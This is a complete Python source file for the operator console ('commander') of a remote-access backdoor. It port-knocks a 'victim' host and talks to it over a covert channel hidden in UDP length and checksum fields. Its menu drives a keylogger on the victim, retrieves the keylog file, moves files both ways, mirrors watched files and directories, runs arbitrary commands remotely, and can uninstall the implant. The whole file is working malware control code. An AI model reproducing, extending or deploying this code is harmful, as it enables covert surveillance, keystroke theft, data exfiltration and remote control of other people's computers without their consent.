import os
import socket
import threading
import time
import sys
from scapy.all import IP, Raw, send, sr1, UDP, sniff, conf

#TARGET_IP = "192.168.1.87"
slave_ip_addr = ""
KNOCK_SEQUENCE = [8888, 6666, 4444]
IFACE = "en0"
conf.iface = IFACE
CLIENT_SPORT = 5000
WINDOW_SIZE = 16
TIMEOUT = 2.0
MAX_SEQ = 4096
SLAVE_PORT = 4322
MAX_FILE_SIZE = 102400

# Part of the protocol is to include the flag for reliability, followed by the seq, then the payload. 
# [4 bit flag][12 bit seq][16 bit payload]
# Opcode usually within the first payload sent
FLAG_SYN = "1000"
FLAG_ACK = "0100"
FLAG_FIN = "0010"
FLAG_RST = "0001"
FLAG_NONE = "0000"

OP_DISCONNECT = "0001"
OP_UNINSTALL = "0010"
OP_START_KEYLOGGER = "0011"
OP_STOP_KEYLOGGER = "0100"
OP_GET_KEYLOG_FILE = "0101"
OP_UPLOAD = "0110"
OP_DOWNLOAD = "0111"
OP_WATCH_FILE = "1000"
OP_WATCH_DIR = "1001"
OP_SEND_COMMAND = "1010"
OP_STOP_FILE_WATCH = "1011"
OP_STOP_DIR_WATCH = "1100"

def bytes_to_bit_str(data: bytes) -> str:
    return "".join(format(b, '08b') for b in data)

def bit_str_to_bytes(bit_str: str) -> bytes:
    return bytes(int(bit_str[i:i+8], 2) for i in range(0, len(bit_str), 8))

def char_str_to_bit_str(char_str: str) -> str:
    return "".join(format(ord(c), '08b') for c in char_str)

def bit_str_to_char_str(bit_str: str) -> str:
    return "".join(chr(int(bit_str[i:i+8], 2)) for i in range(0, len(bit_str), 8))

def pack_frame(flag_str: str, seq: int, payload_bits: str) -> bytes:
    seq_str = format(seq % MAX_SEQ, '012b')
    frame_str = flag_str + seq_str + payload_bits
    return int(frame_str, 2).to_bytes(4, byteorder='big')

def unpack_frame(raw_bytes: bytes):
    if len(raw_bytes) < 4:
        return None
    frame_str = format(int.from_bytes(raw_bytes[:4], 'big'), '032b')
    return frame_str[:4], int(frame_str[4:16], 2), frame_str[16:]

def pack_frame_to_udp_fields(flag_str: str, seq_int: int, payload_bits: str):
    seq_bits = format(seq_int & 0xFFF, "012b")
    payload_bits = payload_bits[:16].ljust(16, "0")
    frame_str = flag_str + seq_bits + payload_bits
    #print(frame_str)
    frame_int = int(frame_str, 2)

    udp_len = (frame_int >> 16) & 0xFFFF
    udp_chksum = frame_int & 0xFFFF
    #print(udp_len)
    return udp_len, udp_chksum

def payload_from_bytes(data: bytes) -> str:
    if len(data) == 0:
        return "0" * 16
    if len(data) == 1:
        data = data + b'\x00'
    return bytes_to_bit_str(data[:2])

def opcode_payload(opcode_str: str) -> str:
    return opcode_str + "0" * 12

def send_ack(target_ip: str, seq: int):
    udp_len, udp_chksum = pack_frame_to_udp_fields(
        flag_str=FLAG_ACK, seq_int=seq, payload_bits="0" * 16,
    )
    send(IP(dst=target_ip) / UDP(dport=SLAVE_PORT, sport=CLIENT_SPORT,
         len=udp_len, chksum=udp_chksum), verbose=False)

def send_rst(target_ip: str):
    udp_len, udp_chksum = pack_frame_to_udp_fields(
        flag_str=FLAG_RST, seq_int=0, payload_bits="0" * 16,
    )
    send(IP(dst=target_ip) / UDP(dport=SLAVE_PORT, sport=CLIENT_SPORT,
         len=udp_len, chksum=udp_chksum), verbose=False)

def _unwrap_ack(ack_mod: int, base_abs: int) -> int:
    era = (base_abs // MAX_SEQ) * MAX_SEQ
    candidate = era + ack_mod
    if candidate < base_abs - MAX_SEQ // 2:
        candidate += MAX_SEQ
    return candidate

# Function to reliably send a message to the victim from commander
def send_reliable(target_ip: str, payload_chunks: list, opcode_str: str, window_size: int = WINDOW_SIZE):
    # Using a Go-Back-N strat for packet reliability in case packets drop and stuff
    ack_event = threading.Event()

    def _sniff_syn_ack():
        def _cb(pkt):
            if (pkt.haslayer(UDP)
                    and pkt[IP].src == target_ip
                    and pkt[UDP].dport == CLIENT_SPORT):
                r = unpack_frame(pkt[UDP].len.to_bytes(2, "big") + pkt[UDP].chksum.to_bytes(2, "big"))
                if r and r[0] == FLAG_ACK:
                    ack_event.set()
        sniff(iface=IFACE,
              filter=f"udp and src host {target_ip} and dst port {CLIENT_SPORT}",
              prn=_cb, store=0,
              stop_filter=lambda p: ack_event.is_set(), timeout=5)

    th = threading.Thread(target=_sniff_syn_ack, daemon=True)
    th.start()
    # Give the BPF socket time to fully open
    time.sleep(0.5)

    # Send the SYN
    udp_len, udp_chksum = pack_frame_to_udp_fields(
        flag_str=FLAG_SYN,
        seq_int=0,
        payload_bits=opcode_payload(opcode_str),
    )
    send(IP(dst=target_ip) / UDP(dport=SLAVE_PORT, sport=CLIENT_SPORT,
         len=udp_len, chksum=udp_chksum), verbose=False)

    th.join(timeout=6)

    if not ack_event.is_set():
        print("[send_reliable] No SYN-ACK. Aborting.")
        return False

    n = len(payload_chunks)
    base = 1
    next_seq = 1
    lock = threading.Lock()
    done = threading.Event()
    remote_ack = [0]

    def _recv_acks():
        def _cb(pkt):
            if (pkt.haslayer(UDP)
                    and pkt[IP].src == target_ip
                    and pkt[UDP].dport == CLIENT_SPORT):
                r = unpack_frame(pkt[UDP].len.to_bytes(2, "big") + pkt[UDP].chksum.to_bytes(2, "big"))
                if r:
                    flag, seq, _ = r
                    if flag == FLAG_ACK:
                        with lock:
                            remote_ack[0] = seq
                    elif flag == FLAG_RST:
                        done.set()
        # bpf filter for sniff to use
        bpf = f"udp and src host {target_ip} and dst port {CLIENT_SPORT}"
        while not done.is_set():
            sniff(iface=IFACE, filter=bpf, prn=_cb, store=0,
                  stop_filter=lambda p: done.is_set(), timeout=5)

    ack_thread = threading.Thread(target=_recv_acks, daemon=True)
    ack_thread.start()

    last_progress = time.time()
    retransmit_count = 0
    MAX_RETRANSMITS = 15

    try:
        while base <= n:
            with lock:
                cur_ack_mod = remote_ack[0]

            abs_ack = _unwrap_ack(cur_ack_mod, base)
            if abs_ack >= base:
                base = abs_ack + 1
                last_progress = time.time()
                retransmit_count = 0

            if time.time() - last_progress > TIMEOUT:
                retransmit_count += 1
                if retransmit_count > MAX_RETRANSMITS:
                    print(f"[send_reliable] No ACKs after {MAX_RETRANSMITS} retransmits. Gonna abort now")
                    break
                next_seq = base
                last_progress = time.time()
                print(f"[send_reliable] Retransmit #{retransmit_count} from seq={base}")

            while next_seq < base + window_size and next_seq <= n:
                chunk = payload_chunks[next_seq - 1]
                is_fin = (next_seq == n)
                flag = FLAG_FIN if is_fin else FLAG_NONE

                udp_len, udp_chksum = pack_frame_to_udp_fields(
                    flag_str=flag,
                    seq_int=next_seq % MAX_SEQ,
                    payload_bits=payload_from_bytes(chunk),
                )
                pkt = IP(dst=target_ip) / UDP(
                    dport=SLAVE_PORT, sport=CLIENT_SPORT,
                    len=udp_len, chksum=udp_chksum,
                )
                send(pkt, verbose=False)
                next_seq += 1
            time.sleep(0.005)
    finally:
        done.set()
    return True

def receive_reliable_once(target_ip: str, stop_event: threading.Event, wait_timeout: float = 5.0, transfer_timeout: float = 60.0):
    chunks = {}
    expected_seq = [0]
    opcode_str = [None]
    result = [None, None]
    local_stop = threading.Event()
    session_started = [False]
    last_activity = [time.time()]

    def _cb(pkt):
        if stop_event.is_set():
            local_stop.set()
            return
        if not (pkt.haslayer(UDP)):
            return
        if pkt[IP].src != target_ip or pkt[UDP].dport != CLIENT_SPORT:
            return

        parsed = unpack_frame(pkt[UDP].len.to_bytes(2, "big") + pkt[UDP].chksum.to_bytes(2, "big"))
        if not parsed:
            return
        flag, seq, payload_bits = parsed
        last_activity[0] = time.time()

        if flag == FLAG_SYN:
            chunks.clear()
            expected_seq[0] = 1
            opcode_str[0] = payload_bits[:4]
            session_started[0] = True
            send_ack(target_ip, 0)
            return

        if flag == FLAG_RST:
            local_stop.set()
            return

        if flag in (FLAG_NONE, FLAG_FIN):
            if not session_started[0]:
                return
            exp = expected_seq[0]
            if seq == exp % MAX_SEQ:
                chunks[exp] = bit_str_to_bytes(payload_bits)
                send_ack(target_ip, seq)
                expected_seq[0] += 1
                if flag == FLAG_FIN:
                    stream = b"".join(chunks[i] for i in sorted(chunks))
                    result[0] = opcode_str[0]
                    result[1] = stream
                    local_stop.set()
            else:
                send_ack(target_ip, (exp - 1) % MAX_SEQ)

    bpf = f"udp and src host {target_ip} and dst port {CLIENT_SPORT}"

    def _sniff_worker():
        while not local_stop.is_set():
            sniff(iface=IFACE, filter=bpf, prn=_cb, store=0,
                  stop_filter=lambda p: local_stop.is_set(), timeout=3)
        local_stop.set()

    st = threading.Thread(target=_sniff_worker, daemon=True)
    st.start()

    while not local_stop.is_set() and not stop_event.is_set():
        idle = time.time() - last_activity[0]
        limit = transfer_timeout if session_started[0] else wait_timeout
        if idle > limit:
            local_stop.set()
            break
        time.sleep(0.1)
    local_stop.set()
    st.join(timeout=2)
    return result[0], result[1]

def start_receiver(target_ip: str, stop_event: threading.Event, wait_timeout: float = 5.0, transfer_timeout: float = 60.0):
    result = [None, None]
    ready = threading.Event()

    def _run():
        ready.set()
        op, stream = receive_reliable_once(target_ip, stop_event, wait_timeout, transfer_timeout)
        result[0] = op
        result[1] = stream

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    ready.wait()
    time.sleep(0.05)
    return t, result

def serialize_file(filepath: str) -> bytes:
    name = os.path.basename(filepath).encode('utf-8')
    with open(filepath, 'rb') as f:
        data = f.read(MAX_FILE_SIZE)
    return len(name).to_bytes(2, 'big') + name + len(data).to_bytes(4, 'big') + data

def deserialize_stream(stream: bytes):
    idx = 0
    name_size = int.from_bytes(stream[idx:idx+2], 'big'); idx += 2
    filename = stream[idx:idx+name_size].decode('utf-8'); idx += name_size
    file_size = int.from_bytes(stream[idx:idx+4], 'big'); idx += 4
    file_data = stream[idx:idx+file_size]
    return filename, file_data

def serialize_message(message: str) -> bytes:
    msg_bytes = message.encode('utf-8')
    return len(msg_bytes).to_bytes(2, 'big') + msg_bytes

def stream_to_chunks(data: bytes) -> list:
    chunks = []
    for i in range(0, len(data), 2):
        chunk = data[i:i+2]
        if len(chunk) == 1:
            chunk += b'\x00'
        chunks.append(chunk)
    return chunks or [b'\x00\x00']

def name_request_stream(path: str) -> bytes:
    name_bytes = path.encode('utf-8')
    return len(name_bytes).to_bytes(2, 'big') + name_bytes

def parse_dir_event(stream: bytes):
    idx = 0
    type_size = int.from_bytes(stream[idx:idx+1], 'big'); idx += 1
    event_type = stream[idx:idx+type_size].decode('utf-8'); idx += type_size
    name_size = int.from_bytes(stream[idx:idx+2], 'big'); idx += 2
    filepath = stream[idx:idx+name_size].decode('utf-8'); idx += name_size
    data_size = int.from_bytes(stream[idx:idx+4], 'big'); idx += 4
    file_data = stream[idx:idx+data_size]
    return event_type, filepath, file_data

def cmd_disconnect():
    print("[0001] Sending disconnect...")
    send_reliable(slave_ip_addr, [b'\x00\x00'], OP_DISCONNECT)
    print("[0001] Disconnected.")

def cmd_uninstall():
    print("[0010] Sending the uninstall request")
    send_reliable(slave_ip_addr, [b'\x00\x00'], OP_UNINSTALL)
    print("[0010] Request sent.")

def cmd_start_keylogger():
    print("[0011] Starting Keylogger")
    send_reliable(slave_ip_addr, [b'\x00\x00'], OP_START_KEYLOGGER)

def cmd_stop_keylogger():
    print("[0100] Stopping Keylogger")
    send_reliable(slave_ip_addr, [b'\x00\x00'], OP_STOP_KEYLOGGER)

def cmd_download_keylog_file():
    print("[0101] Requesting keylog.txt file")
    no_cancel = threading.Event()
    t, result = start_receiver(slave_ip_addr, no_cancel, wait_timeout=10, transfer_timeout=60)
    send_reliable(slave_ip_addr, [b'\x00\x00'], OP_GET_KEYLOG_FILE)
    t.join()

    if result[1] is None:
        print("[0101] No data received.")
        return

    filename, file_data = deserialize_stream(result[1])
    save_path = os.path.join("downloads", filename)
    os.makedirs("downloads", exist_ok=True)
    with open(save_path, 'wb') as f:
        f.write(file_data)
    print(f"[0101] Saved '{filename}' ({len(file_data)} bytes) to {save_path}")

def cmd_upload_file(filepath: str):
    if not os.path.exists(filepath):
        print(f"[0110] File not found: {filepath}")
        return
    print(f"[0110] Uploading '{filepath}'...")
    stream = serialize_file(filepath)
    chunks = stream_to_chunks(stream)
    send_reliable(slave_ip_addr, chunks, OP_UPLOAD)
    print("[0110] Upload complete.")

def cmd_download_file(filepath: str):
    print(f"[0111] Downloading '{filepath}' from server...")
    no_cancel = threading.Event()
    t, result = start_receiver(slave_ip_addr, no_cancel, wait_timeout=10, transfer_timeout=60)
    request = name_request_stream(filepath)
    chunks = stream_to_chunks(request)
    send_reliable(slave_ip_addr, chunks, OP_DOWNLOAD)
    t.join()

    if result[1] is None:
        print("[0111] No data received (file may not exist on server).")
        return

    filename, file_data = deserialize_stream(result[1])
    save_path = os.path.join("downloads", filename)
    os.makedirs("downloads", exist_ok=True)
    with open(save_path, 'wb') as f:
        f.write(file_data)
    print(f"[0111] Saved '{filename}' ({len(file_data)} bytes) to {save_path}")

def cmd_watch_file(filepath: str):
    print(f"[1000] Watching '{filepath}' on server...")
    stop_event = threading.Event()

    no_cancel = threading.Event()
    t, _ = start_receiver(slave_ip_addr, no_cancel, wait_timeout=5, transfer_timeout=5)
    send_reliable(slave_ip_addr, stream_to_chunks(name_request_stream(filepath)), OP_WATCH_FILE)
    t.join()

    print("[1000] File is now being monitored for changes. Press Ctrl + C to stop watching.")
    try:
        while not stop_event.is_set():
            op, stream = receive_reliable_once(slave_ip_addr, stop_event, wait_timeout=5, transfer_timeout=60)
            if stream is None:
                continue

            filename, file_data = deserialize_stream(stream)
            save_path = os.path.join("watched", filename)
            os.makedirs("watched", exist_ok=True)

            with open(save_path, 'wb') as f:
                f.write(file_data)
            print(f"[1000] Updated: '{filename}' ({len(file_data)} bytes) to {save_path}")

    except KeyboardInterrupt:
        stop_event.set()
        print("\n[1000] Watch cancelled. Tell victim to stop watching")
        send_reliable(slave_ip_addr, stream_to_chunks(name_request_stream(filepath)), OP_STOP_FILE_WATCH)
        print("[1000] Request to stop watching has been sent.")

def cmd_watch_directory(dirpath: str):
    basename = os.path.basename(os.path.normpath(dirpath.replace("\\", "/")))
    mirror_root = os.path.join("mirror", basename)
    os.makedirs(mirror_root, exist_ok=True)
    print(f"[1001] Watching server directory '{dirpath}'. Mirror: {mirror_root}")
    stop_event = threading.Event()

    # Start watching
    no_cancel = threading.Event()
    t, _ = start_receiver(slave_ip_addr, no_cancel, wait_timeout=5, transfer_timeout=5)
    send_reliable(slave_ip_addr, stream_to_chunks(name_request_stream(dirpath)), OP_WATCH_DIR)
    t.join()

    print("[1001] Directory is now being monitored for changes. Press Ctrl + C to stop watching.")
    try:
        while not stop_event.is_set():
            op, stream = receive_reliable_once(slave_ip_addr, stop_event, wait_timeout=5, transfer_timeout=60)
            if stream is None:
                continue
            try:
                event_type, remote_path, file_data = parse_dir_event(stream)

                if event_type == 'rename':
                    old_name, new_name = remote_path.split('\x00', 1)
                    old_path = os.path.join(mirror_root, old_name)
                    new_path = os.path.join(mirror_root, new_name)

                    # Delete the old file if it exists locally
                    if os.path.exists(old_path):
                        os.remove(old_path)
                        print(f"[1001] Rename: deleted old '{old_name}'")

                    # Else we should write the new file with the file data
                    with open(new_path, 'wb') as f:
                        f.write(file_data)
                    print(f"[1001] Rename: created '{new_name}' ({len(file_data)} bytes)")

                elif event_type == 'delete':
                    clean = remote_path.replace("\\", "/")
                    local_name = os.path.basename(os.path.normpath(clean))
                    save_path = os.path.join(mirror_root, local_name)
                    if os.path.exists(save_path):
                        os.remove(save_path)
                        print(f"[1001] Deleted:  '{save_path}'")
                    else:
                        print(f"[1001] Delete skipped (not found locally): '{local_name}'")

                else:
                    # Create/Update
                    clean = remote_path.replace("\\", "/")
                    local_name = os.path.basename(os.path.normpath(clean))
                    save_path = os.path.join(mirror_root, local_name)
                    with open(save_path, 'wb') as f:
                        f.write(file_data)
                    print(f"[1001] Upserted: '{save_path}' ({len(file_data)} bytes)")

            except Exception as e:
                print(f"[1001] Could not parse update: {e}")

    except KeyboardInterrupt:
        stop_event.set()
        print("\n[1001] Watch cancelled. Tell victim to stop watching")
        send_reliable(slave_ip_addr, stream_to_chunks(name_request_stream(dirpath)), OP_STOP_DIR_WATCH)
        print("[1001] Request to stop watching has been sent.")

def cmd_send_command(command_to_run: str):
    print(f"[1010] Sending command: '{command_to_run}'")
    no_cancel = threading.Event()
    t, result = start_receiver(slave_ip_addr, no_cancel, wait_timeout=10, transfer_timeout=15)
    stream = serialize_message(command_to_run)
    chunks = stream_to_chunks(stream)
    send_reliable(slave_ip_addr, chunks, OP_SEND_COMMAND)
    t.join()

    if result[1] is not None:
        msg_size = int.from_bytes(result[1][:2], 'big')
        echo = result[1][2:2+msg_size].decode('utf-8', errors='replace')
        print(f"[1010] {command_to_run} output:\n{echo}")
    else:
        print("[1010] No output received from the victim.")

def connect():
    print(f"Starting port knock sequence to {slave_ip_addr}...")
    for port in KNOCK_SEQUENCE:
        packet = IP(dst=slave_ip_addr) / UDP(dport=port)
        send(packet, verbose=False)
        print(f"Knocked on UDP port: {port}")
        time.sleep(0.5)

    print(f"Sending confirmation probe to UDP port {SLAVE_PORT}...")
    probe_packet = IP(dst=slave_ip_addr) / UDP(sport=CLIENT_SPORT, dport=SLAVE_PORT)
    bpf_filter = f"udp and src host {slave_ip_addr} and dst port {CLIENT_SPORT}"
    response = sr1(probe_packet, iface=IFACE, timeout=10, verbose=False, filter=bpf_filter)

    if response and response.haslayer(UDP):
        udp_pkt = response[UDP]
        parsed = unpack_frame(udp_pkt.len.to_bytes(2, "big") + udp_pkt.chksum.to_bytes(2, "big"))
        if parsed and parsed[0] == FLAG_ACK:
            print("ACK received. Connection established.")
            return

    raise Exception("Failed to receive ACK from the victim. Timing out.")

MENU_TEXT = """
\n
Commander
1. Disconnect from the victim
2. Uinstall from the victim
3. Start keylogger from the victim
4. Stop keylogger from the victim
5. Transfer the key log file from the victim
6. Transfer a file to the victim
7. Trasnfer a file from the victim
8. Watch a file on the victim
9. Watch a directory on the victim
10. Run a program on the victim
\n
"""
def menu():
    while True:
        print(MENU_TEXT)
        choice = input("Enter choice (1-10): ").strip()
        if choice in [str(i) for i in range(1, 11)]:
            return int(choice)
        print("Invalid choice. Please enter 1-10.")

def main():
    global slave_ip_addr
    try:
        if len(sys.argv) < 2:
            print("Usage: sudo python3 commander.py <slave_ip_addr>")
            sys.exit(1)
        slave_ip_addr = sys.argv[1]
        connect()
        while True:
            choice = menu()
            if choice == 1:
                cmd_disconnect()
                sys.exit(0)
            elif choice == 2:
                cmd_uninstall()
                sys.exit(0)
            elif choice == 3:
                cmd_start_keylogger()
            elif choice == 4:
                cmd_stop_keylogger()
            elif choice == 5:
                cmd_download_keylog_file()
            elif choice == 6:
                fp = input("Enter local file path to upload: ").strip()
                cmd_upload_file(fp)
            elif choice == 7:
                fp = input("Enter remote file path to fetch: ").strip()
                cmd_download_file(fp)
            elif choice == 8:
                fp = input("Enter remote file path to watch: ").strip()
                cmd_watch_file(fp)
            elif choice == 9:
                dp = input("Enter remote directory path to watch: ").strip()
                cmd_watch_directory(dp)
            elif choice == 10:
                command_to_run = input("Enter command: ").strip()
                cmd_send_command(command_to_run)

    except KeyboardInterrupt:
        print("\nKeyboard Interrupt detected. Closing.")

if __name__ == "__main__":
    main()